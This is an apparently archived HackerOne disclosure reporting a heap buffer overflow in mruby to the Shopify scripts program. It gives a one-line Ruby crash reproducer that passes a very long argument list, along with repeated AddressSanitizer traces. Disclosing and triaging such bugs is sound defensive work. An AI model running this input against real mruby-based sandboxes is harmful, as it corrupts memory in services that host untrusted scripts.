# Heap buffer oveflow with many arguments

## Report Details
- **Report ID**: 204421
- **URL**: https://hackerone.com/reports/204421
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-02-08T01:08:34.201Z
- **Disclosed**: 2017-02-28T00:51:01.130Z

## Reporter
- **Username**: titanous
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
The following program triggers a heap buffer overflow:

```ruby
d 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 < 0 - 0.-- 0
```

ASAN report:

```text
=================================================================
==3720==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61d00001e880 at pc 0x0000004ae8ac bp 0x7ffee59f8930 sp 0x7ffee59f80e0
WRITE of size 16 at 0x61d00001e880 thread T0
    #0 0x4ae8ab in __asan_memcpy (/vagrant/bin/mruby+0x4ae8ab)
    #1 0x64ad6d in value_move /vagrant/src/value_array.h:14:15
    #2 0x629792 in mrb_vm_exec /vagrant/src/vm.c:1181:11
    #3 0x620b8b in mrb_vm_run /vagrant/src/vm.c:801:10
    #4 0x64d298 in mrb_top_run /vagrant/src/vm.c:2533:12
    #5 0x676ec9 in mrb_load_exec /vagrant/mrbgems/mruby-compiler/core/parse.y:5755:7
    #6 0x677b65 in mrb_load_file_cxt /vagrant/mrbgems/mruby-compiler/core/parse.y:5764:10
    #7 0x4f3af5 in main /vagrant/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
    #8 0x7fb19c1e3f44 in __libc_start_main /build/eglibc-oGUzwX/eglibc-2.19/csu/libc-start.c:287
    #9 0x41a505 in _start (/vagrant/bin/mruby+0x41a505)

0x61d00001e880 is located 0 bytes to the right of 2048-byte region [0x61d00001e080,0x61d00001e880)
allocated by thread T0 here:
    #0 0x4c4c0d in realloc (/vagrant/bin/mruby+0x4c4c0d)
    #1 0x5c14f5 in mrb_default_allocf /vagrant/src/state.c:60:12
    #2 0x550b96 in mrb_realloc_simple /vagrant/src/gc.c:201:8
    #3 0x5511e4 in mrb_realloc /vagrant/src/gc.c:215:8
    #4 0x551b23 in mrb_malloc /vagrant/src/gc.c:236:10
    #5 0x551bbd in mrb_calloc /vagrant/src/gc.c:254:9
    #6 0x618d19 in stack_init /vagrant/src/vm.c:92:28
    #7 0x616446 in mrb_funcall_with_block /vagrant/src/vm.c:365:7
    #8 0x615e60 in mrb_funcall_with_block /vagrant/src/vm.c:343:13
    #9 0x6156dc in mrb_funcall_argv /vagrant/src/vm.c:447:10
    #10 0x5247e7 in mrb_obj_new /vagrant/src/class.c:1412:3
    #11 0x53f2fe in mrb_exc_new_str /vagrant/src/error.c:32:10
    #12 0x5489ee in mrb_init_exception /vagrant/src/error.c:550:20
    #13 0x6a5710 in mrb_init_core /vagrant/src/init.c:41:3
    #14 0x5c1495 in mrb_open_core /vagrant/src/state.c:47:3
    #15 0x5c163c in mrb_open_allocf /vagrant/src/state.c:107:20
    #16 0x5c160a in mrb_open /vagrant/src/state.c:99:20
    #17 0x4f29d3 in main /vagrant/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:172:20
    #18 0x7fb19c1e3f44 in __libc_start_main /build/eglibc-oGUzwX/eglibc-2.19/csu/libc-start.c:287

SUMMARY: AddressSanitizer: heap-buffer-overflow (/vagrant/bin/mruby+0x4ae8ab) in __asan_memcpy
Shadow bytes around the buggy address:
  0x0c3a7fffbcc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbcd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbce0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbcf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbd00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c3a7fffbd10:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fffbd60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==3720==ABORTING
vagrant@vagrant-ubuntu-trusty-64:/vagrant$ ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-3.8/bin/llvm-symbolizer bi^Cmruby crash-triage/02.rb
vagrant@vagrant-ubuntu-trusty-64:/vagrant$ ~/mruby-engine/bin/sandbox crash-triage/02.rb
/home/vagrant/mruby-engine/bin/sandbox:20:in `sandbox_eval': undefined method '-' for nil (MRubyEngine::EngineRuntimeError)
	from /home/vagrant/mruby-engine/bin/sandbox:20:in `<main>'
vagrant@vagrant-ubuntu-trusty-64:/vagrant$ ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-3.8/bin/llvm-symbolizer bin/mruby crash-triage/02.rb
=================================================================
==3777==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61d00001e880 at pc 0x0000004ae8ac bp 0x7ffe2236f750 sp 0x7ffe2236ef00
WRITE of size 16 at 0x61d00001e880 thread T0
    #0 0x4ae8ab in __asan_memcpy (/vagrant/bin/mruby+0x4ae8ab)
    #1 0x64ad6d in value_move /vagrant/src/value_array.h:14:15
    #2 0x629792 in mrb_vm_exec /vagrant/src/vm.c:1181:11
    #3 0x620b8b in mrb_vm_run /vagrant/src/vm.c:801:10
    #4 0x64d298 in mrb_top_run /vagrant/src/vm.c:2533:12
    #5 0x676ec9 in mrb_load_exec /vagrant/mrbgems/mruby-compiler/core/parse.y:5755:7
    #6 0x677b65 in mrb_load_file_cxt /vagrant/mrbgems/mruby-compiler/core/parse.y:5764:10
    #7 0x4f3af5 in main /vagrant/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
    #8 0x7f534ad6cf44 in __libc_start_main /build/eglibc-oGUzwX/eglibc-2.19/csu/libc-start.c:287
    #9 0x41a505 in _start (/vagrant/bin/mruby+0x41a505)

0x61d00001e880 is located 0 bytes to the right of 2048-byte region [0x61d00001e080,0x61d00001e880)
allocated by thread T0 here:
    #0 0x4c4c0d in realloc (/vagrant/bin/mruby+0x4c4c0d)
    #1 0x5c14f5 in mrb_default_allocf /vagrant/src/state.c:60:12
    #2 0x550b96 in mrb_realloc_simple /vagrant/src/gc.c:201:8
    #3 0x5511e4 in mrb_realloc /vagrant/src/gc.c:215:8
    #4 0x551b23 in mrb_malloc /vagrant/src/gc.c:236:10
    #5 0x551bbd in mrb_calloc /vagrant/src/gc.c:254:9
    #6 0x618d19 in stack_init /vagrant/src/vm.c:92:28
    #7 0x616446 in mrb_funcall_with_block /vagrant/src/vm.c:365:7
    #8 0x615e60 in mrb_funcall_with_block /vagrant/src/vm.c:343:13
    #9 0x6156dc in mrb_funcall_argv /vagrant/src/vm.c:447:10
    #10 0x5247e7 in mrb_obj_new /vagrant/src/class.c:1412:3
    #11 0x53f2fe in mrb_exc_new_str /vagrant/src/error.c:32:10
    #12 0x5489ee in mrb_init_exception /vagrant/src/error.c:550:20
    #13 0x6a5710 in mrb_init_core /vagrant/src/init.c:41:3
    #14 0x5c1495 in mrb_open_core /vagrant/src/state.c:47:3
    #15 0x5c163c in mrb_open_allocf /vagrant/src/state.c:107:20
    #16 0x5c160a in mrb_open /vagrant/src/state.c:99:20
    #17 0x4f29d3 in main /vagrant/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:172:20
    #18 0x7f534ad6cf44 in __libc_start_main /build/eglibc-oGUzwX/eglibc-2.19/csu/libc-start.c:287

SUMMARY: AddressSanitizer: heap-buffer-overflow (/vagrant/bin/mruby+0x4ae8ab) in __asan_memcpy
Shadow bytes around the buggy address:
  0x0c3a7fffbcc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbcd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbce0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbcf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c3a7fffbd00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c3a7fffbd10:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c3a7fffbd50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3a7fffbd60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==3777==ABORTING
```

## Attachments
No attachments
